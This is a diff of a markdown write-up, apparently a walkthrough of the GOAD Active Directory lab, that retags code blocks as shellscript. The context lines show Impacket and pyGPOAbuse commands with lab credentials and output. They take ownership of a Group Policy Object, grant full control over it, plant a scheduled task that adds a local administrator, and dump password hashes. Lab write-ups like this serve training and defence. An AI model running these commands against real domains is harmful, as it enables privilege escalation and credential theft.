@@ -253,7 +253,7 @@ Samwell.tarly does have multiple Outbound Object Control over the Starkwallpaper
 
 #### **WriteOwner**
 
-```text
+```shellscript
 owneredit.py winterfell.north.sevenkingdoms.local/'samwell.tarly':'Heartsbane' -new-owner 'samwell.tarly' -target-dn 'CN={AA5A8682-1C17-4D7E-BD44-2120A3102555},CN=POLICIES,CN=SYSTEM,DC=NORTH,DC=SEVENKINGDOMS,DC=LOCAL' -action write -dc-ip 10.10.10.11
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -266,7 +266,7 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
 #### **WriteDacl**
 
-```text
+```shellscript
 dacledit.py -action 'write' -rights 'FullControl' -principal 'samwell.tarly' -target-dn 'CN={AA5A8682-1C17-4D7E-BD44-2120A3102555},CN=POLICIES,CN=SYSTEM,DC=NORTH,DC=SEVENKINGDOMS,DC=LOCAL' 'north.sevenkingdoms.local'/'samwell.tarly':'Heartsbane' -dc-ip 10.10.10.11
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -278,7 +278,7 @@ samwell.tarly now owns starkwallpaper.
 
 ![Image](/images/image-5.png "Image")
 
-```text
+```shellscript
 (venv) ➜  pyGPOAbuse git:(master) python3 pygpoabuse.py north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -gpo-id "5DE02488-B4EF-4CDE-BFC3-CC8AC01B6E49"  -dc-ip 10.10.25.11
 [+] ScheduledTask TASK_ac0d7d31 created!
 ```
@@ -311,7 +311,7 @@ After the `gpudate /force` command, I now have a user called `John` as a `local 
 
 Since our malicious John is a local administrator, I can dump all user password hashes using impacket-secretdump.
 
-```text
+```shellscript
 impacket-secretsdump north.sevenkingdoms.loca/john:H4x00r123..@10.10.25.11
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
